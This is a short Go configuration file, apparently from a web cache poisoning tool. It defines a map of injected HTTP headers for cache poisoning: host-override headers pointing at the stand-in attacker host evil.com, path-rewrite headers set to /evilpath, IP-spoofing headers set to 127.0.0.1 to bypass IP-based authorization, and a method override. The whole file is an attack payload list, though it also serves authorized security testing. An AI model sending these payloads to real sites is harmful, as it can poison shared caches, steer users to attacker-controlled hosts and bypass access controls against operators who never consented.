package config

// Default Payload Headers to be used for cache poisoning
var PayloadHeaders = map[string]string{
	"X-Forwarded-Host":          "evil.com",
	"X-Original-URL":            "/evilpath",
	"X-Forwarded-For":           "127.0.0.1",
	"X-Host":                    "evil.com",
	"X-Custom-IP-Authorization": "127.0.0.1",
	"X-Forwarded-Proto":         "https",
	"X-Forwarded-Port":          "443",
	"X-Rewrite-URL":             "/evilpath",
	"X-Original-Host":           "evil.com",
	"X-ProxyUser-Ip":            "127.0.0.1",
	"X-Forwarded-Server":        "evil.com",
	"X-Url-Scheme":              "https",
	"X-Requested-With":          "XMLHttpRequest",
	"X-Host-Override":           "evil.com",
	"X-Forwarded-Host-Override": "evil.com",
	"X-Forwarded-Scheme":        "https",
	"X-Client-IP":               "127.0.0.1",
	"Forwarded":                 "for=127.0.0.1;host=evil.com;proto=https",
	"X-HTTP-Method-Override":    "POST",
}
